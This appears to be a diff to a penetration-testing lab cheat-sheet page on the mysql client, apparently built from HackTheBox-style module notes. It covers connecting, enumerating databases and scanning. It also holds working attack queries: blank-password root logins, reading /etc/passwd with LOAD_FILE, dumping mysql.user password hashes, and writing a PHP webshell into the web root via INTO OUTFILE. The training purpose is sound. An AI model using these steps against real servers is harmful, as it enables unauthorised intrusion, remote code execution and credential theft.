@@ -9,6 +9,104 @@ hideFooterPagination: true
 
 {/* Generated from Commands/mysql.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## mysql: choose the operation and read the result
+
+Connect to MySQL/MariaDB and query databases.
+
+### What the result establishes
+
+Identify version, current database, effective user and grants before selecting schemas, tables and columns.
+
+### Prerequisites and common failures
+
+SQL access, FILE privilege, server filesystem access and OS execution are separate capabilities; avoid assuming a remote DB shares the web host's filesystem.
+
+### Example 1: Commands
+
+Run in: **Kali / MySQL prompt**.
+
+```bash
+mysql -h TARGET_IP -u USER -p
+# Inside mysql
+SHOW DATABASES;
+USE DATABASE_NAME;
+SHOW TABLES;
+```
+
+### Example 2: Footprinting & scanning
+
+Run in: **Saved lab example**.
+
+```bash
+sudo nmap <IP> -sV -sC -p3306 --script mysql*
+```
+
+Saved context: [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Footprinting & scanning
+
+Run in: **Saved lab example**.
+
+```bash
+mysql -u root -h <IP>      # try a blank-password root login directly
+```
+
+Saved context: [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Connecting & interacting
+
+Run in: **Saved lab example**.
+
+```bash
+mysql -u <user> -p<password> -h <IP>     # NOTE: no space between -p and the password
+mysql -u root   -h <IP>                  # prompt-less attempt (blank password)
+```
+
+Saved context: [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: From DB access to the filesystem (and RCE)
+
+Run in: **Saved lab example**.
+
+```sql
+-- Check whether file operations are allowed and where they're confined
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+-- Read an arbitrary local file as the MySQL service account
+SELECT LOAD_FILE('/etc/passwd');
+
+-- Write a PHP webshell into the web root → browse to it for RCE
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+Saved context: [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: SQL Syntax
+
+Run in: **Saved lab example**.
+
+```bash
+mysql> USE htbusers;
+```
+
+Saved context: [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Select a Database
+
+Run in: **Saved lab example**.
+
+```text
+mysql> USE htbusers;
+
+Database changed
+```
+
+Saved context: [Attacking SQL Databases: Module Notes — Select a Database](/modules/common-services/sql#select-a-database). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Connect to MySQL/MariaDB and query databases.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=mysql) · [All tools](/index)
@@ -24,6 +122,13 @@ SHOW DATABASES;
 USE DATABASE_NAME;
 SHOW TABLES;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 1: Commands](/enumeration/mysql-mariadb-cheat-sheet#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -50,6 +155,13 @@ find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
 ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 5. Credential hunting (Linux)](/cheatsheets/ad-attack-path-worked-example#5-credential-hunting-linux)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MySQL - Connecting to the SQL Server">
@@ -72,6 +184,13 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MySQL [(none)]>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking SQL Databases: Module Notes — MySQL - Connecting to the SQL Server](/modules/common-services/sql#mysql-connecting-to-the-sql-server)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Select a Database">
@@ -85,6 +204,13 @@ mysql> USE htbusers;
 
 Database changed
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 7: Select a Database](/enumeration/mysql-mariadb-cheat-sheet#example-7-select-a-database) · [Attacking SQL Databases: Module Notes — Select a Database](/modules/common-services/sql#select-a-database)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -112,6 +238,13 @@ mysql> SHOW TABLES;
 8 rows in set (0.00 sec)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking SQL Databases: Module Notes — Show Tables](/modules/common-services/sql#show-tables)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Attacking SQL Databases: Module Notes**
 
 ```text
@@ -128,6 +261,13 @@ mysql> SELECT * FROM users;
 4 rows in set (0.00 sec)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking SQL Databases: Module Notes — Show Tables](/modules/common-services/sql#show-tables)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Execute Commands">
@@ -142,6 +282,13 @@ mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html
 Query OK, 1 row affected (0.001 sec)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Execute Commands](/modules/common-services/full-reference#execute-commands) · [Attacking SQL Databases: Module Notes — MySQL - Write Local File](/modules/common-services/sql#mysql-write-local-file)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```bash
@@ -155,6 +302,13 @@ mysql> show variables like "secure_file_priv";
 
 1 row in set (0.005 sec)
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Execute Commands](/modules/common-services/full-reference#execute-commands) · [Attacking SQL Databases: Module Notes — MySQL - Secure File Privileges](/modules/common-services/sql#mysql-secure-file-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Common Services: Full Module Reference**
 
@@ -173,6 +327,13 @@ sync:x:4:65534:sync:/bin:/bin/sync
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Execute Commands](/modules/common-services/full-reference#execute-commands) · [Attacking SQL Databases: Module Notes — MySQL - Read Local Files in MySQL](/modules/common-services/sql#mysql-read-local-files-in-mysql)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="MySQL">
@@ -186,6 +347,13 @@ grcic550@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13
 
 We can easily start an interactive SQL Session using Windows:
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — MySQL](/modules/common-services/full-reference#mysql)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Footprinting: Service-by-Service Lab Workflow**
 
@@ -202,6 +370,13 @@ show tables;
 select * from users;
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — MySQL](/enumeration/footprinting-lab-methodology-cheat-sheet#mysql)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Read/Change the Database">
@@ -217,6 +392,13 @@ Welcome to the MariaDB monitor. Commands end with ; or \g.
 Your MySQL connection id is 8
 Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Read/Change the Database](/modules/common-services/full-reference#read/change-the-database)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -238,11 +420,25 @@ mysql> SHOW DATABASES;
 2 rows in set (0.00 sec)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax) · [Attacking SQL Databases: Module Notes — Show Databases](/modules/common-services/sql#show-databases)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```bash
 mysql> USE htbusers;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 6: SQL Syntax](/enumeration/mysql-mariadb-cheat-sheet#example-6-sql-syntax) · [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Common Services: Full Module Reference**
 
@@ -263,6 +459,13 @@ mysql> SHOW TABLES;
 +----------------------------+
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```bash
@@ -278,6 +481,13 @@ mysql> SELECT * FROM users;
 +----+---------------+------------+---------------------+
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Phase 2 — Direct MariaDB Access (and Why This Isn&#x27;t &quot;SQL Injection&quot;)">
@@ -289,6 +499,13 @@ mysql> SELECT * FROM users;
 ```text
 mysql -h $target -u fiona -p987654321 --ssl=FALSE
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Phase 2 — Direct MariaDB Access (and Why This Isn't "SQL Injection")](/modules/common-services/assessment#phase-2-—-direct-mariadb-access-and-why-this-isnt-sql-injection)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -308,6 +525,13 @@ user1:password1
 user2:password2
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials on Windows — High-value Windows locations](/password-attacks/credential-hunting-in-windows#high-value-windows-locations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Connecting &amp; interacting">
@@ -321,6 +545,13 @@ mysql -u <user> -p<password> -h <IP>     # NOTE: no space between -p and the pas
 mysql -u root   -h <IP>                  # prompt-less attempt (blank password)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 4: Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#example-4-connecting-&-interacting) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **MySQL and MariaDB Enumeration**
 
 Context from the notebook: USE &lt;db>; Switch into a database
@@ -328,6 +559,13 @@ Context from the notebook: USE &lt;db>; Switch into a database
 ```text
 USE <db>;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **MySQL and MariaDB Enumeration**
 
@@ -337,6 +575,13 @@ Context from the notebook: SHOW TABLES; List tables in the current database
 SHOW TABLES;
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **MySQL and MariaDB Enumeration**
 
 Context from the notebook: SELECT * FROM &lt;table>; Dump a table's rows
@@ -344,6 +589,13 @@ Context from the notebook: SELECT * FROM &lt;table>; Dump a table's rows
 ```text
 SELECT * FROM <table>;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **MySQL and MariaDB Enumeration**
 
@@ -353,6 +605,13 @@ Context from the notebook: SELECT version(); Server version → maps to CVEs
 SELECT version();
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **MySQL and MariaDB Enumeration**
 
 Context from the notebook: SELECT user, authentication_string FROM mysql.user; Dump usernames + password hashes  (needs privileges)
@@ -360,6 +619,13 @@ Context from the notebook: SELECT user, authentication_string FROM mysql.user; D
 ```text
 SELECT user, authentication_string FROM mysql.user;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -373,11 +639,25 @@ SELECT user, authentication_string FROM mysql.user;
 sudo nmap <IP> -sV -sC -p3306 --script mysql*
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 2: Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#example-2-footprinting-&-scanning) · [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **MySQL and MariaDB Enumeration**
 
 ```bash
 mysql -u root -h <IP>      # try a blank-password root login directly
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 3: Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#example-3-footprinting-&-scanning) · [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -397,6 +677,13 @@ SELECT LOAD_FILE('/etc/passwd');
 -- Write a PHP webshell into the web root → browse to it for RCE
 SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Example 5: From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#example-5-from-db-access-to-the-filesystem-and-rce) · [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -434,6 +721,13 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 └── Either → reverse shell via exploit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Default system databases">
@@ -447,6 +741,13 @@ Context from the notebook: The data  you  want is in the non-default databases �
 ```text
 SHOW DATABASES;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Default system databases](/enumeration/mysql-mariadb-cheat-sheet#default-system-databases) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -462,6 +763,13 @@ Context from the notebook: Write files  to disk ( INTO OUTFILE ), e.g. dropping 
 INTO OUTFILE
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Why a database login can become host compromise](/enumeration/mysql-mariadb-cheat-sheet#why-a-database-login-can-become-host-compromise) · [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce) · [MySQL and MariaDB Enumeration — Key Takeaways](/enumeration/mysql-mariadb-cheat-sheet#key-takeaways) · [SQL Injection — Prove write access before assuming execution](/web/sqli#prove-write-access-before-assuming-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **MySQL and MariaDB Enumeration**
 
 Context from the notebook: The setting that gates file read/write is  secure_file_priv : if it's empty, file operations can target  any  path (dangerous); if it points to a folder, they're confined to it; if it's  NULL , they're disabled. Checking this value ( SHOW VARIABLES LIKE 'secure_file_priv'; ) tells you immediately whether the file-based attacks below are on the table.
@@ -469,6 +777,13 @@ Context from the notebook: The setting that gates file read/write is  secure_fil
 ```text
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [MySQL and MariaDB Enumeration — Why a database login can become host compromise](/enumeration/mysql-mariadb-cheat-sheet#why-a-database-login-can-become-host-compromise) · [Common Services: Personal Assessment Notes — Phase 3 — Writing a Webshell to the Correct Location via SQL](/modules/common-services/assessment#phase-3-—-writing-a-webshell-to-the-correct-location-via-sql) · [SQL Injection — File access is a separate privilege check](/web/sqli#file-access-is-a-separate-privilege-check) · [SQL Injection Fundamentals — HTB Module — Write File Privileges](/web/htb/sql-injection-fundamentals#write-file-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -484,6 +799,21 @@ Context from the notebook: MySQL 3306 mysql -u &lt;user> -p&lt;pass> -h &lt;IP>
 mysql -u <user> -p<pass> -h <IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Database Protocols](/reference/master-protocol-service-quick-reference#database-protocols)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [MySQL and MariaDB Enumeration](/enumeration/mysql-mariadb-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
